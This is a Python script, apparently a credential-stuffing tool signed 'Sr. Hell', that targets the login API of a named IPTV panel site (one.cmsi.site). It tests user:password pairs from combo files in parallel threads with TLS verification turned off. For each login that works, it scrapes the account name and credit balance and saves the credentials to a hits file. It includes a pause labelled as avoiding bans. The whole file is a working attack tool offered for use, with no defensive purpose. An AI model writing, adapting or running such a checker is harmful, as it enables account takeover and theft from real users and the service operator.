#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configurações de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:'
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:'
    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:'
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:'
    'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:'
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:'
    'TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:'
    'TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:'
    'TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:'
    'TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP'
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Cores ANSI para o console
VERDE = '\033[92m'
VERMELHO = '\033[91m'
AZUL = '\033[94m'
RESET = '\033[0m'
GREEN = '\033[92m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def update_terminal_title(new_title):
    sys.stdout.write(f"\033]2;{new_title}\007")
    sys.stdout.flush()

NAME = "[Hell] OneTV_Py"
update_terminal_title(NAME)

def get_terminal_size():
    try:
        return os.get_terminal_size()
    except AttributeError:
        return os.terminal_size((80, 24))

def create_ascii_art():
    ascii_art = """
<code base/>
<atk painel onetv/>
•••••••••</>•••••••••
<algoritm by Sr. Hell/>
    """
    return ascii_art

def center_text(text, width):
    return "\n".join(line.center(width) for line in text.splitlines())

def login_and_get_dashboard(username, password):
    login_url = 'https://one.cmsi.site/sys/api.php'
    login_headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    }
    login_data = {
        'action': 'login',
        'username': username,
        'password': password
    }

    try:
        with requests.Session() as session:
            login_response = session.post(login_url, headers=login_headers, data=login_data, verify=False)
            login_json = login_response.json()

            if not login_json.get('success'):
                return None, None

            dashboard_url = 'https://one.cmsi.site/dashboard'
            dashboard_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://one.cmsi.site/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'upgrade-insecure-requests': '1'
            }

            dashboard_response = session.get(dashboard_url, headers=dashboard_headers, verify=False)
            soup = BeautifulSoup(dashboard_response.text, 'html.parser')

            credits_element = soup.find('spam', class_='credits_badge')
            credits = credits_element.text.split(': ')[1] if credits_element else 'Créditos não encontrados'

            name_element = soup.find('div', class_='user-panel')
            if name_element:
                name_element = name_element.find('a', class_='d-block')
                name = name_element.text.split(', ')[1] if name_element else username
            else:
                name = username

            return name, credits
    except Exception as e:
        print(f"Erro ao processar login: {str(e)}")
        return None, None

def listar_arquivos_combo():
    diretorio = "/storage/emulated/0/combo"
    arquivos = [f for f in os.listdir(diretorio) if f.endswith('.txt')]
    print("Arquivos disponíveis:")
    for i, arquivo in enumerate(arquivos, 1):
        print(f"{i}. {arquivo}")
    while True:
        try:
            srhell = int(input("Escolha o número do arquivo: ")) - 1
            if 0 <= srhell < len(arquivos):
                return os.path.join(diretorio, arquivos[srhell])
            else:
                print("Escolha inválida. Tente novamente.")
        except ValueError:
            print("Por favor, insira um número válido.")

def process_account(user, password, i, total):
    print(f"Verificando {i}/{total}", end="\r")
    name, credits = login_and_get_dashboard(user, password)
    if name and credits:
        print(VERDE + f"\n==[ Login válido ]==\n • User: {user}\n • Pass: {password}" + RESET)
        print(f" ===<use infos/>===\n • Nome: {name}")
        print(f" • Créditos: {credits}")
        with open("/storage/emulated/0/Hits/one_tv_hits.txt", "a") as hit_file:
            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
        return True
    else:
        print(VERMELHO + f"\nLogin inválido: {user}:{password}" + RESET)
        return False

def main():
    clear_screen()
    terminal_size = get_terminal_size()
    ascii_art = create_ascii_art()
    centered_art = center_text(ascii_art, terminal_size.columns)
    signature = center_text("Don't pay for something 'free'.\n\n", terminal_size.columns)
    
    baner = f"{GREEN}{centered_art}\n\n{signature}{RESET}"
    print(baner)
    
    arquivo_combo = listar_arquivos_combo()
    
    with open(arquivo_combo, 'r') as file:
        linhas = file.readlines()

    total = len(linhas)
    validos = 0

    print(f"\nVerificando {total} contas...\n")

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i, linha in enumerate(linhas, 1):
            try:
                user, password = linha.strip().split(':')
                futures.append(executor.submit(process_account, user, password, i, total))
            except ValueError:
                #print(VERMELHO + f"\nErro de formatação na linha {i}: {linha}" + RESET)
                continue

        for future in as_completed(futures):
            if future.result():
                validos += 1

            if len(futures) % 100 == 0:
                print(AZUL + "\nPausando por 0.5 segundos para evitar banimento..." + RESET)
                time.sleep(0.1)

    print(f"\nTotal de válidos: {validos}/{total}\n")

if __name__ == "__main__":
    main()
